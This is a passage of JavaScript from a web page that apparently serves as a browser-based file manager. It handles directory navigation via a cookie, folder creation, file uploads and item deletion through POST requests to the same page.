        document.cookie = "current_dir=" + encodeURIComponent(dir) + "; path=/";
    }

    function getCookie(name) {
        let value = "; " + document.cookie;
        let parts = value.split("; " + name + "=");
        if (parts.length === 2) return decodeURIComponent(parts.pop().split(";").shift());
    }

    Zepto(document).on('click', '.dir-link', function(e) {
        e.preventDefault();
        var newDir = Zepto(this).data('dir');
        updateURL(newDir); // Update URL state without changing path
        refreshTable(newDir); // Update the content with the new directory
    });

    Zepto('#create-folder-form').submit(function(e) {
        e.preventDefault();
        var formData = Zepto(this).serialize();
        formData += '&dir=' + encodeURIComponent(getCookie('current_dir'));
        Zepto.post('', formData, function(response) {
            response = JSON.parse(response);
            alert(response.message);
            if (response.status === 'success') {
                refreshTable(getCookie('current_dir'));
            }
        }).fail(function() {
            console.error('Failed to create folder.');
        });
    });

    Zepto('#upload-dir').val(getCookie('current_dir'));

    Zepto('#upload-form').submit(function(e) {
        e.preventDefault();
        var formData = new FormData(this);
        fetch('', {
            method: 'POST',
            body: formData
        })
        .then(response => response.json())
        .then(data => {
            alert(data.message);
            if (data.status === 'success') {
                refreshTable(Zepto('#upload-dir').val());
            }
        })
        .catch(error => {
            console.error('Error:', error);
            alert('An error occurred while uploading the file.');
        });
    });

    Zepto(document).on('click', '.delete-btn', function() {
        var path = Zepto(this).data('path');
        if (confirm('Are you sure you want to delete this item?')) {
            Zepto.post('', { action: 'delete', path: path }, function(response) {
                response = JSON.parse(response);
                alert(response.message);
                if (response.status === 'success') {
                    refreshTable(getCookie('current_dir'));
                }
            }).fail(function() {
                console.error('Failed to delete item.');
            });
        }
    });

    window.onpopstate = function(event) {
        if (event.state && event.state.dir) {
            refreshTable(event.state.dir);
        }
    };

    var initialDir = getCookie('current_dir');
    if (initialDir) {
        refreshTable(decodeURIComponent(initialDir));
    }
});

</script>
</body>
</html>

